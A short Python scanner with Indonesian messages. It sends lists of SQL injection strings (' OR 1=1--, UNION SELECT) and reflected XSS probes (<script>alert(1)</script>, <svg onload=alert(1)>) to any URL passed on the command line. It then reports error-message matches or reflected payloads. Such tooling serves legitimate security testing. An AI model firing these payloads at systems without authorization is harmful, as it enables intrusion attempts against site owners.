import requests
import re
import sys

sqli_payloads = [
    "' OR 1=1--",
    "admin' --",
    "' UNION SELECT NULL,NULL--",
    "' OR 'a'='a",
    "1 OR 1=1"
]

xss_payloads = [
    '<script>alert(1)</script>',
    '"><script>alert(1)</script>',
    '<svg onload=alert(1)>',
    '<iframe src=javascript:alert(1)></iframe>'
]

def test_sqli(url):
    result = []
    for payload in sqli_payloads:
        try:
            r = requests.get(url, params={'q': payload}, timeout=5, allow_redirects=False)
            if r.status_code in [301, 302]:
                result.append(f'❌ Redirect saat SQLi payload: {payload}')
                continue
            if re.search(r'sql|syntax|mysql|error', r.text, re.I):
                result.append(f'✅ SQLi terdeteksi dengan payload: {payload}')
        except:
            continue
    return '\n'.join(result) if result else '❌ Tidak ada indikasi SQLi'

def test_xss(url):
    result = []
    for payload in xss_payloads:
        try:
            r = requests.get(url, params={'x': payload}, timeout=5, allow_redirects=False)
            if r.status_code in [301, 302]:
                result.append(f'❌ Redirect saat XSS payload: {payload}')
                continue
            if payload in r.text:
                result.append(f'✅ XSS tercermin: {payload}')
        except:
            continue
    return '\n'.join(result) if result else '❌ Tidak ada indikasi XSS'

if __name__ == '__main__':
    target = sys.argv[1]
    print('--- SQL Injection Test ---')
    print(test_sqli(target))
    print('--- XSS Test ---')
    print(test_xss(target))
